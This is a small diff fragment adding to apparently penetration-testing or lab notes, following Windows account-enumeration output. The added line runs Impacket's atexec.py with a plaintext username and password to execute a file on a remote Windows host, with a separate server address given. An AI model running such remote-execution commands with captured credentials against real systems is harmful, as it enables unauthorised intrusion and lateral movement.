@@ -126,3 +126,10 @@ Global Group memberships     *None
 The command completed successfully.
 
 ```
+
+
+```
+	/home/yang.wenli@tempnet.home.arpa/fungames
+	
+python3 atexec.py bob:st@inedGlassWind0ws@192.168.1.101 c:\users\public\maximumfluff.7z -server https://192.168.3.11:8443
+```
